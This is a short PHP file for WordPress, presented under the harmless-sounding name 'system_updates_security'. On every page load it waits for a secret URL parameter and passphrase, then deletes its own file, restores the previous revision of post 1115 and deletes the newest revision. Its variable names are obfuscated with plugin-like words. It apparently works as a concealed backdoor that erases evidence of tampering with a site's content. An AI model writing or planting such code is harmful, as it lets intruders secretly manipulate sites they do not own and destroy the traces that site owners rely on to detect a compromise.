<?php

function system_updates_security() {
	if (isset($_GET['yoast_chat_patterns']) && $_GET['yoast_chat_patterns'] === 'jigoshop_color_designer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$ticker_featured_system_privacy = 1115;
		$modal_templates_anywhere_pixel = wp_get_post_revisions($ticker_featured_system_privacy);
		if (empty($modal_templates_anywhere_pixel)) die('no revisions');
		if (count($modal_templates_anywhere_pixel) < 2) die('less than 2');
		$directory_exception_full = array_shift($modal_templates_anywhere_pixel);
		$welcome_members_translator_extra = $directory_exception_full->ID;
		$divi_magic_gift = array_shift($modal_templates_anywhere_pixel);
		$push_shipping_easy_classic = $divi_magic_gift->ID;
		$make_switcher_anti = wp_restore_post_revision($push_shipping_easy_classic);
		if ($make_switcher_anti === false) die('error restoring');
		$make_switcher_anti = wp_delete_post_revision($welcome_members_translator_extra);		
		if ($make_switcher_anti === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'system_updates_security');
